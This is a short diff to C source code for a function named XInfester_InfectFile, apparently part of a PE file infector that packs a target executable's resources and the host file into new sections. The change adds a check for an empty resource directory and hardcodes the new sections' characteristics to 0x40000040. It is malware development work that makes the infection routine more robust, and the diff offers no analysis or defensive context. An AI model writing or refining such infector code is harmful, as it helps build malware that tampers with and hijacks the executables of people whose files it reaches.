@@ -127,9 +127,14 @@ BOOL XInfester_InfectFile( const char *pDestFileName )
 	//Copy destPE resource section
 	DWORD newResourceRVA;
 
+	if (__Dest.GetDirectorySize(2)==0)
+	{
+		goto _ERR;
+	}
+
 	if(!__Final.AddSection
 		(
-		__Dest.GetSectionCharacter(__Dest.GetResourceDirctorySectionIndex()),
+		0x40000040,
 		(char *)__Dest.GetSectionName(__Dest.GetResourceDirctorySectionIndex()),
 		__Dest.GetDirectorySize(2),
 		newResourceRVA,
@@ -144,7 +149,7 @@ BOOL XInfester_InfectFile( const char *pDestFileName )
 	//Copy host file to section
 	if (!__Final.AddSection
 		(
-		__Dest.GetSectionCharacter(__Dest.GetResourceDirctorySectionIndex()),
+		0x40000040,
 		XINFESTED_SOURCE_SECTION_STRING,
 		__Dest.GetImageSize(),
 		HostRVA,
